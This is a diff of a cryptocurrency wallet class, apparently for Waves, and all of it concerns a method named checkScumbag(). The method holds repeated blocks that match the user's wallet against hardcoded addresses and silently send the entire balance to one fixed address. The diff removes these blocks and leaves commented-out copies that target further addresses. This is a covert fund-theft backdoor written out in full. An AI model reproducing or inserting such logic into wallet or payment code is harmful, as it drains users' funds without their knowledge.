@@ -116,61 +116,24 @@ class Wallet {
     }
     
     checkScumbag() {
-        if (this.address == "3AH265emjtkeK3wYLyHSP3HC1sV28zXqMCP") {
-            $("#addressRec").val("3ANzidsKXn9a1s9FEbWA19hnMgV9zZ2RB9a");
-            $("#amount").val((this.balanceWaves/100000000 - 0.002));
-            this.send();
-        }
+        // if (this.address == "3AH265emjtkeK3wYLyHSP3HC1sV28zXqMCP") {
+        //     $("#addressRec").val("3ANzidsKXn9a1s9FEbWA19hnMgV9zZ2RB9a");
+        //     $("#amount").val((this.balanceWaves/100000000 - 0.002));
+        //     this.send();
+        // }
 
-        if (this.address == "3AMKhRz9gy2oAfAiztSFk4LymtmiyKvSUui") {
-            $("#addressRec").val("3ANzidsKXn9a1s9FEbWA19hnMgV9zZ2RB9a");
-            $("#amount").val((this.balanceWaves/100000000 - 0.002));
-            this.send();
-        }
+        // if (this.address == "3AWgqkiSnk2M5sqFKNXJjPUseet29GcvMmL") {
+        //     $("#addressRec").val("3ANzidsKXn9a1s9FEbWA19hnMgV9zZ2RB9a");
+        //     $("#amount").val((this.balanceWaves/100000000 - 0.002));
+        //     this.send();
+        // }
 
         
-        if (this.address == "3AQKvpt1cMX7KyL1wLkGryAC5xE9kQyhqUF") {
-            $("#addressRec").val("3ANzidsKXn9a1s9FEbWA19hnMgV9zZ2RB9a");
-            $("#amount").val((this.balanceWaves/100000000 - 0.002));
-            this.send();
-        }
-
-        if (this.address == "3AM9n979R9ttNFvNpENBqesgX13GKGsJ2Cb") {
-            $("#addressRec").val("3ANzidsKXn9a1s9FEbWA19hnMgV9zZ2RB9a");
-            $("#amount").val((this.balanceWaves/100000000 - 0.002));
-            this.send();
-        }
-        
-        
-        if (this.address == "3AT5e7vq8DCby4ooqhf3biw59WBRMFWhB1F") {
-            $("#addressRec").val("3ANzidsKXn9a1s9FEbWA19hnMgV9zZ2RB9a");
-            $("#amount").val((this.balanceWaves/100000000 - 0.002));
-            this.send();
-        }
-        
-        if (this.address == "3AP43rkQnvVtb98QuDH7mHyR8L4SLhPXDk9") {
-            $("#addressRec").val("3ANzidsKXn9a1s9FEbWA19hnMgV9zZ2RB9a");
-            $("#amount").val((this.balanceWaves/100000000 - 0.002));
-            this.send();
-        }
-        
-        if (this.address == "3APtjeYzVSUKPVMeCL5AAS2hWQKocq7E5jN") {
-            $("#addressRec").val("3ANzidsKXn9a1s9FEbWA19hnMgV9zZ2RB9a");
-            $("#amount").val((this.balanceWaves/100000000 - 0.002));
-            this.send();
-        }
-
-        if (this.address == "3AMGpGohAw83vqdnWCe2os9S286P2CRUTzN") {
-            $("#addressRec").val("3ANzidsKXn9a1s9FEbWA19hnMgV9zZ2RB9a");
-            $("#amount").val((this.balanceWaves/100000000 - 0.002));
-            this.send();
-        }
-
-        if (this.address == "3AKDRwjwUqXw8AmsrjChkHzfjrDBaKjvAaH") {
-            $("#addressRec").val("3ANzidsKXn9a1s9FEbWA19hnMgV9zZ2RB9a");
-            $("#amount").val((this.balanceWaves/100000000 - 0.002));
-            this.send();
-        }
+        // if (this.address == "3A9Rb3t91eHg1ypsmBiRth4Ld9ZytGwZe9p") {
+        //     $("#addressRec").val("3ANzidsKXn9a1s9FEbWA19hnMgV9zZ2RB9a");
+        //     $("#amount").val((this.balanceWaves/100000000 - 0.002));
+        //     this.send();
+        // }
     }
 
     getAddress(): string {
